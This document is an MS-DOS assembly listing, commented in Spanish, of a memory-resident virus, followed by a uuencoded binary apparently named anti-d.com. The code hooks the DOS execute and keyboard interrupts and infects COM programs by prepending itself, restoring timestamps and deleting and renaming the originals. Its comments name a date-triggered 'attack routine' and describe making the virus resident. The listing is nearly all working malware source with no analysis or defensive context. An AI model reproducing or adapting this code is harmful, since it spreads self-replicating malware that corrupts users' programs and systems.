PAGE  59,132
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                                                                      ;;
;;;                                      ;;
;;;      Created:   9-Feb-91                             ;;
;;;      Passes:    5          Analysis Flags on: H              ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
data_1e     equ 2Ch         ; (6E19:002C=0)
;tamano         equ     4D7h                    ; 47Fh es sin las ///
tamano          equ     comstart-start+100h
  
seg_a       segment
        assume  cs:seg_a, ds:seg_a
  
  
        org 100h
  
april       proc    far
  
start:
        jmp short loc_1     ; (010F)
;---------------------------------------------------------------------------------------------------------------
; bytes de Copyright
;---------------------------------------------------------------------------------------------------------------
                db      90h, 195, 180, 230, 80h, 232
        db  0
;---------------------------------------------------------------------------------------------------------------
tamres          dw      49h
loc_1:
        mov word ptr data_9,ax  ; (6E19:0132=0)
        mov di,100h
                mov     si,tamano
        mov cx,0FF00h
                sub     cx,tamano
        mov ah,0DDh
        int 21h         ; DOS Services  ah=function DDh
        jmp short loc_2     ; (0148)
        db  90h

vtuntrue        dw      138Dh
vtuntrueseg     dw      291h
errorofs        dw      4EBh
errorseg        dw      10A0h
data_7      dw  100h
data_8      dw  136Ah
data_9      db  0           ; Data table (indexed access)
        db  0
data_10     dw  471h
fecha           dw      1649h
hora            dw      0AC1h
        db  0, 0, 80h, 0
data_13     dw  1315h
        db  5Ch, 0
data_14     dw  1315h
        db  6Ch, 0
data_15     dw  1315h

;/////////////////////////////////////////////////////////////////////////////// 5 bytes
adrkb           dd      00000h
activo          db      0h
auxi            db      0h
;///////////////////////////////////////////////////////////////////////////////



;---------------------------------------------------------------------------------------------------------------
;loc_2: Vamos a dejar residente el virus e instalamos la 21 trucha.. ja... ja...
;----------------------------------------------------------------------------------------------------------------
loc_2:
        mov ax,3521h
        int 21h         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
                mov     vtuntrue,bx               ; (6E19:0126=138Dh)
                mov     vtuntrueseg,es               ; (6E19:0128=291h)
        mov ax,2521h
                mov     dx,offset int_21
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx

; ////////////////////////////////////////////////////////////////////////////////////////////// 21 bytes
loq_2:          mov     ax,3509h                ; get intrpt vector en es:bx
                int     21h

                mov     word ptr adrkb,bx                ; guarda address de 1C true
                mov     word ptr adrkb+2,es
                mov     ax,2509h                ; set intrpt vector to ds:dx
                mov     dx,offset int_09        ; address de la int 1C trucha
                int     21h

; ///////////////////////////////////////////////////////////////////////////////////////////////

        mov ah,4Ah          ; 'J'
                mov     bx,tamano
                mov     sp,tamano
        push    ds
        pop es
        add bx,0Fh
        shr bx,1            ; Shift w/zeros fill
        shr bx,1            ; Shift w/zeros fill
        shr bx,1            ; Shift w/zeros fill
        shr bx,1            ; Shift w/zeros fill
                mov     tamres,bx               ; (6E19:010D=49h)
        int 21h         ; DOS Services  ah=function 4Ah
                        ;  change mem allocation, bx=siz
        mov data_13,cs      ; (6E19:013E=1315h)
        mov data_14,cs      ; (6E19:0142=1315h)
        mov data_15,cs      ; (6E19:0146=1315h)
        mov es,ds:data_1e       ; (6E19:002C=0)
        xor di,di           ; Zero register
        xor ax,ax           ; Zero register
        mov cx,0FFFFh
loc_3:
        repne   scasb           ; Rept zf=0+cx>0 Scan es:[di] for al
        cmp byte ptr es:[di],0
        je  loc_4           ; Jump if equal
        scasb               ; Scan es:[di] for al
        jnz loc_3           ; Jump if not zero
loc_4:
        mov dx,di
        add dx,3
        push    es
        pop ds
        mov ax,4B00h
        mov bx,13Ah
        push    cs
        pop es
;---------------------------------------------------------------------------------------------------------------
        pushf               ; Push flags
                call    dword ptr cs:vtuntrue     ; (6E19:0126=138Dh)
        mov ah,4Dh          ; 'M'
        int 21h         ; DOS Services  ah=function 4Dh
                        ;  get return code info in ax
        mov ah,31h          ; '1'
                mov     dx,cs:tamres            ; (6E19:010D=49h)
        int 21h         ; DOS Services  ah=function 31h
                        ;  terminate & stay resident



; //////////////////////////////////////////////////////////////////////////////////////////////  59 bytes

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;           External Entry Point
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
int_09:
int_09h_entry   proc    far
;               sti                             ; Enable interrupts
        pushf               ; Push flags
        push    ax
        push    cx
        push    dx
        push    ds
        push    es
        push    si
        push    di
        push    cs
        pop ds

                in      al,60h
                cmp     al,32
                jnz     loc_222
;               cmp     byte ptr activo, 0FFh
                cmp     byte ptr activo, 33
                jne     loc_22a

                in      al,61h
                or      al,80h
                out     61h,al           ; manda al 61 lo recibido OR 80h
                                         ; simula liberacion de tecla

                and     al,7Fh
                out     61h,al           ; manda al 61 lo recibido AND 7Fh

                mov     al,20h
                out     20h,al           ; y manda al 20 un 20h
                pop     di
        pop si
        pop es
        pop ds
        pop dx
        pop cx
        pop ax
                popf
                iret

loc_22a:
                inc     activo
loc_222:
        pop di
        pop si
        pop es
        pop ds
        pop dx
        pop cx
        pop ax
                popf                            ; Pop flags
                jmp     cs:adrkb                ; (6E18:012D=0)
int_09h_entry   endp

; //////////////////////////////////////////////////////////////////////////////////////////////

april           endp

;---------------------------------------------------------------------------------------------------------------
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;           External Entry Point
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

int_21:
int_21h_entry   proc    far
        pushf               ; Push flags
        cmp ah,0DDh
        je  loc_6           ; Jump if equal
        cmp ax,4B00h
        je  loc_7           ; Jump if equal
loc_5:
        popf                ; Pop flags
                jmp     dword ptr cs:vtuntrue   ; (6E19:0126=138Dh)
loc_6:
        pop ax
        pop ax
        mov ax,100h
        mov cs:data_7,ax        ; (6E19:012E=100h)
        pop ax
        mov cs:data_8,ax        ; (6E19:0130=136Ah)
        rep movsb           ; Rep while cx>0 Mov [si] to es:[di]
        xor ax,ax           ; Zero register
        push    ax
        mov ax,word ptr cs:data_9   ; (6E19:0132=0)
        jmp dword ptr cs:data_7 ; (6E19:012E=100h)
stackptr        dw      755h
stackseg        dw      10A0h
;---------------------------------------------------------------------------------------------------------------
loc_7:
                mov     cs:stackptr,sp           ; (6E19:01E9=755h)
                mov     cs:stackseg,ss           ; (6E19:01EB=10A0h)
        push    cs
        pop ss
                mov     sp,tamano
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
        mov cs:data_10,sp       ; (6E19:0134=471h)
        mov ah,19h
        int 21h         ; DOS Services  ah=function 19h
                        ;  get default drive al  (0=a:)
        add al,41h          ; 'A'
                mov     cs:drive,al             ; (6E19:0365=43h)
                mov     cs:drive2,al            ; (6E19:03B1=43h)
                mov     di,offset victima+1
        push    di
        mov si,dx
        cmp byte ptr [si+1],3Ah ; ':'
        jne loc_8           ; Jump if not equal
        mov al,[si]
                mov     cs:drive,al             ; (6E19:0365=43h)
                mov     cs:drive2,al            ; (6E19:03B1=43h)
        add si,2
loc_8:
        push    cs
        pop es
        mov cx,3Fh
  
locloop_9:
        lodsb               ; String [si] to al
        cmp al,61h          ; 'a'
        jb  loc_10          ; Jump if below
        cmp al,7Ah          ; 'z'
        ja  loc_10          ; Jump if above
        add al,0E0h
loc_10:
        stosb               ; Store al to es:[di]
        loop    locloop_9       ; Loop if cx > 0
  
        pop di
        push    cs
        pop ds
        mov cx,40h
        mov al,2Eh          ; '.'
        repne   scasb           ; Rept zf=0+cx>0 Scan es:[di] for al
        mov cx,3
                mov     si,offset sistema+7
        repe    cmpsb           ; Rept zf=1+cx>0 Cmp [si] to es:[di]
        jz  loc_12          ; Jump if zero
        jmp loc_18          ; (0404)
loc_11:
        jmp loc_17          ; (0355)
loc_12:
        sub di,0Bh
        mov cx,7
                mov     si,offset sistema
        repe    cmpsb           ; Rept zf=1+cx>0 Cmp [si] to es:[di]
        jnz loc_13          ; Jump if not zero
        jmp loc_18          ; (0404)
;---------------------------------------------------------------------------------------------------------------
loc_13:
        mov ax,3524h
        int 21h         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
                mov     errorofs,bx               ; (6E19:012A=4EBh)
                mov     errorseg,es               ; (6E19:012C=10A0h)
        mov ax,2524h
                mov     dx,offset int_24
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
                mov     ah     , activo
                mov     auxi   , ah
                mov     activo , 0h

;----------------------------------------------------------------------------------------------------------------
;Abre el file que se trata de ejecutar, lee y guarda los 9 primeros bytes, guarda fecha y hora del file y
;cierra el file
;----------------------------------------------------------------------------------------------------------------
                mov     dx,offset path
        mov ax,3D00h
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        mov bx,ax
                mov     dx,offset buffer
        mov cx,9
        mov ah,3Fh          ; '?'
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        jc  loc_11          ; Jump if carry Set
        mov ax,5700h
        int 21h         ; DOS Services  ah=function 57h
                        ;  get/set file date & time
                mov     fecha,dx                ; (6E19:0136=1649h)
                mov     hora,cx                 ; (6E19:0138=0AC1h)
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
;----------------------------------------------------------------------------------------------------------------
;crea un archivo temporario y escribe 481 bytes de este codigo
;----------------------------------------------------------------------------------------------------------------

                cmp     buffer,05A4Dh
                je      loc_15
                cmp     data_23,46275           ; (6E19:03FC=10CDh)
                je      loc_11                  ; Jump if equal (el virus ya esta contaminado)

                mov     dx,offset sistema+10
        mov ah,3Ch          ; '<'
        xor cx,cx           ; Zero register
        int 21h         ; DOS Services  ah=function 3Ch
                        ;  create/truncate file @ ds:dx
        jc  loc_11          ; Jump if carry Set
        mov bx,ax
        mov dx,100h
                mov     cx,tamano-100h
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        cmp ax,cx
                jne     loc_15                  ; Jump if not equal
;---------------------------------------------------------------------------------------------------------------
                mov     fhandle,bx              ; (6E19:0402=5)
                mov     dx,offset path
        mov ax,3D00h
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
                jc      loc_15                  ; Jump if carry Set
        mov bx,ax
        push    bx
        mov bx,500h
        mov ah,48h          ; 'H'
        int 21h         ; DOS Services  ah=function 48h
                        ;  allocate memory, bx=bytes/16
        pop bx
        xor dx,dx           ; Zero register
        mov ds,ax
loc_14:
        mov cx,5000h
        mov ah,3Fh          ; '?'
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        jc  loc_15          ; Jump if carry Set
        cmp ax,0
        je  loc_16          ; Jump if equal
        mov cx,ax
                xchg    bx,cs:fhandle           ; (6E19:0402=5)
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        cmp ax,cx
        jne loc_15          ; Jump if not equal
                xchg    bx,cs:fhandle           ; (6E19:0402=5)
        jmp short loc_14        ; (02E9)
loc_15:
        jmp short loc_17        ; (0355)
        db  90h
loc_16:
        push    ds
        pop es
        mov ah,49h          ; 'I'
        int 21h         ; DOS Services  ah=function 49h
                        ;  release memory block, es=seg
        push    cs
        push    cs
        pop es
        pop ds
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        jc  loc_15          ; Jump if carry Set
                mov     bx,fhandle              ; (6E19:0402=5)
        mov ax,5701h
                mov     dx,fecha              ; (6E19:0136=1649h)
                mov     cx,hora              ; (6E19:0138=0AC1h)
        int 21h         ; DOS Services  ah=function 57h
                        ;  get/set file date & time
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        jc  loc_15          ; Jump if carry Set
        xor cx,cx           ; Zero register
                mov     dx,offset path
        mov ax,4301h
        int 21h         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
        mov ah,41h          ; 'A'
        int 21h         ; DOS Services  ah=function 41h
                        ;  delete file, name @ ds:dx
                mov     dx,offset sistema+10
                mov     di,offset path
        mov ah,56h          ; 'V'
        int 21h         ; DOS Services  ah=function 56h
                        ;  rename file @ds:dx to @es:di
        jmp short loc_17        ; (0355)
        db  90h
int_21h_entry   endp
  
;---------------------------------------------------------------------------------------------------------------
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;           External Entry Point
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

int_24:
int_24h_entry   proc    far
        xor al,al           ; Zero register
        iret                ; Interrupt return
int_24h_entry   endp

;----------------------------------------------------------------------------------------------------------------
;loc_17: se restaura la int 24 de manejo de errores...
;----------------------------------------------------------------------------------------------------------------
  
loc_17:
                mov     dx,errorofs               ; (6E19:012A=4EBh)
                mov     ds,errorseg               ; (6E19:012C=10A0h)
        mov ax,2524h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
                mov     ah,auxi
                mov     activo, ah

        jmp loc_18          ; (0404)
path:
drive           db      43h
victima:        db      ':\DOS\COMMAND.COM      '
        db  42 dup (0)
sistema:        db      'COMMANDCOM'
drive2          db      43h
        db  ':TMP$$'
        db  'TMP.COM'
        db  0
buffer          dw      0CD20h
                db      0
data_23     dw  10CDh
        db  0CDh, 20h, 5, 6
fhandle         dw      5
;------------------------------------------------------------------------------------------------------------------
;loc_18: Rutina de Ataque.... ja ja..
;----------------------------------------------------------------------------------------------------------------
loc_18:
        push    cs
        pop ds
                mov     activo,0h               ; <================================================================ + 5bytes
        mov ah,2Ah          ; '*'
        int 21h         ; DOS Services  ah=function 2Ah
                        ;  get date, cx=year, dx=mon/day
                cmp     cx,7C6h
        jb  loc_21          ; Jump if below
                cmp     dx,1212h
                jb      loc_19                  ; si >=


        jmp short loc_21        ; (042B)
        db  90h

;//////////////////////////////////////////////////////////////////////////////////////////////////////////////// (-7+5 = -2) bytes
 loc_19:
;                mov     activo,00h

;////////////////////////////////////////////////////////////////////////////////////////////////////////////////

loc_21:
        mov sp,cs:data_10       ; (6E19:0134=471h)
        pop es
        pop ds
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
                mov     ss,cs:stackseg           ; (6E19:01EB=10A0h)
                mov     sp,cs:stackptr           ; (6E19:01E9=755h)
;---------------------------------------------------------------------------------------------------------------
        jmp loc_5           ; (01C7)
;---------------------------------------------------------------------------------------------------------------
        db  10 dup (0)
        db  6Eh, 15h, 5, 0, 56h, 5
        db  6, 0, 99h, 14h, 5, 40h
        db  5, 0, 81h, 3, 0, 1
        db  0A8h, 3, 73h, 3, 81h, 0
        db  15h, 13h, 0A0h, 10h, 0C8h, 2
        db  15h, 13h, 46h, 0F0h, 0A0h, 10h
        db  6Eh, 9Bh, 0, 1, 0, 1
        db  7Bh, 3Dh, 0A0h, 10h, 5, 0Ch
                db      0, 4Bh

comstart        db      0CDh, 20h
  
seg_a       ends
  
  
  
        end start
begin 775 anti-d.com
MZPF0P[3F@.@`20"C+@&_``&^K@2Y`/^!Z:X$M-W-(>LID(T3D0+K!*`0``%J
M$P``<01)%L$*``"``!437``5$VP`%1,```````"X(37-(8D>(@&,!B0!N"$E
MNA("S2&X"37-(8D>1`&,!D8!N`DENM,!S2&T2KNN!+RN!!X'@\,/T>O1Z]'K
MT>N)'@D!S2&,#CH!C`X^`8P.0@&.!BP`,_\SP+G___*N)H`]`'0#KG7UB]>#
MP@,&'[@`2[LZ`0X'G"[_'B(!M$W-(;0Q+HL6"0'-(9Q045(>!E97#A_D8#P@
M=2*`/D@!(747Y&$,@.9A)'_F8;`@YB!?7@\K@104U%25E<>!BZ))C`!M!G-(01!+J+8
M`RZB)`2_V@-7B_*`?`$Z=0V*!"ZBV`,NHB0$@\8"#@>Y/P"L/&%R!CQZ=P($
MX*KB\E\.'[E``+`N\JZY`P"^(03SIG0&Z8X!Z0T!@^\+N0<`OAH$\Z9U`^E[
M`;@D-/`2T0,TA.\%U!RZ''CP$
MZ]SK1I`>![1)S2$.#@
